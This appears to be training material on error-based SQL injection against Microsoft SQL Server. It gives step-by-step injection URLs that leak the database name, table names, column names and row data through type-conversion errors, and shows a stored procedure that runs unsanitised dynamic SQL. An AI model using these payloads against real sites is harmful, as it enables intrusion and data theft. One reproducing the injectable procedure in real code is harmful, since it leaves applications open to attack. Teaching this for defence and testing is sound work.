An attacker uses the database-level error messages disclosed by an application to build a vulnerability exploit request.

It is also possible to create automated exploits depending on the error messages generated by the database server.

▪ Extract Database Name
http://www.certifiedhacker.com/page.aspx?id=1 or 1=convert(int,(DB_NAME))--
Syntax error converting the nvarchar value '[DB NAME]' into a column of data type int.

▪ Extract 1st Database Table
http://www.certifiedhacker.com/page.aspx?id=1 or 1=convert(int,(select top 1 name from sysobjects where xtype=char(85)))--
Syntax error converting the nvarchar value '[TABLE NAME 1]' into a column of data type int.

▪ Extract 1st Table Column Name 
http://www.certifiedhacker.com/page.aspx?id=1 or 1=convert(int, (select top 1 column_name from DBNAME.information_schema.columns where table_name='TABLE-NAME-1'))--
Syntax error converting the nvarchar value '[COLUMN NAME 1]' into a column of data type int.

▪ Extract 1st Field of 1st Row (Data) 
http://www.certifiedhacker.com/page.aspx?id=1 or 1=convert(int, (select top 1 COLUMN-NAME-1 from TABLE-NAME-1))--
Syntax error converting the nvarchar value '[FIELD 1 VALUE]' into a column of data type int.


Error Based SQL Injection using Stored Procedure Injection:-

 Developers may write static and dynamic SQL statements inside the stored procedures to support the application’s functionality. 

If the developers use dynamic SQL statements in the stored procedure, and if application users input to this dynamic SQL, then the application may be vulnerable to SQL injection attacks.

Stored procedure injection attacks are possible if the application does not properly sanitize its input before processing that input in the stored procedure. 

An attacker can take advantage of improper input validation to launch a stored procedure injection attack on the application

Consider the following SQL server stored procedure:
Create procedure get_report @columnamelist varchar(7900) 
As Declare @sqlstring varchar(8000) Set @sqlstring = ‘ Select ‘ + @columnamelist + ‘ from ReportTable‘ exec(@sqlstring) Go



